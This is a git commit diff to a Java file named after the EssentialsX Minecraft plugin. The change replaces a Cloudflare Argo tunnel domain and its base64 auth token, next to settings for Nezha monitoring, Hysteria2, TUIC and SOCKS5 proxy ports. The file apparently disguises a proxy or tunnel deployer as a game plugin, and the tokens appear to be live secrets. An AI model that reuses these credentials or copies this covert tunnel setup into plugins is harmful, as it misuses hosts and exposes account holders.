ce2d4f1a78b2feaeb85e6a46d08c367700b53ca5
HeEnjie <345616977b@gmail.com>
2026-05-18 17:08:40 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "miget.admire.cc.cd");
-        env.put("ARGO_AUTH", "eyJhIjoiMDI5YmU0Y2RiZTc5MGE1ZDQ4NTg1OTUzYzMwNjljZTMiLCJ0IjoiMjQ1MTc3OWEtY2JkNS00ZGE5LWEwYTAtZGNiZjMzNmE0YTc0IiwicyI6Ik1qZ3hNMk5oT1RrdE1ETXdOaTAwTURRNExXRXlNbVV0T0dZMk9UVmlZbUZqTWpZMSJ9");
+        env.put("ARGO_DOMAIN", "opq.admire.cc.cd");
+        env.put("ARGO_AUTH", "eyJhIjoiMDI5YmU0Y2RiZTc5MGE1ZDQ4NTg1OTUzYzMwNjljZTMiLCJ0IjoiM2Q3ZGIxYTUtZjFjMi00YTM1LThhYTEtOTcwOTc4YzE2M2IyIiwicyI6Ik5UZGtOek5oTjJJdFlUZzFOaTAwTTJVMkxUZzVNemN0TWpkalpXTmlabVk1WkdZNSJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "4592");
         env.put("TUIC_PORT", "");
